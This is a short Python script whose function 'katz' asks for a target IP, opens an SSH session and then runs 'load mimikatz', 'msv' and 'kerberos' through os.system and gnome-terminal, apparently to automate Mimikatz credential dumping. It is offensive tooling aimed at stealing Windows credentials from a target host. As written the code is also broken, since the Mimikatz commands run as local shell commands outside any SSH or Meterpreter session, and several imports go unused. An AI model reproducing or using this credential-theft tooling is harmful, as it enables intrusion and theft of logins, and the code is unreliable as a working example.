import sys
import os
from termcolor import colored
import time


def katz():
	connect = input('Name Of Target IP To Connect To:\n> ')
	ssh = 'ssh ' + connect
	os.system(ssh)
	load = 'load mimikatz'
	os.system(load)
	msv = 'msv'
	gt = 'gnome-terminal ' + msv
	os.system(gt)
	kerbs = 'kerberos'
	gt2 = 'gnome-terminal ' + kerbs
	os.system(gt2)
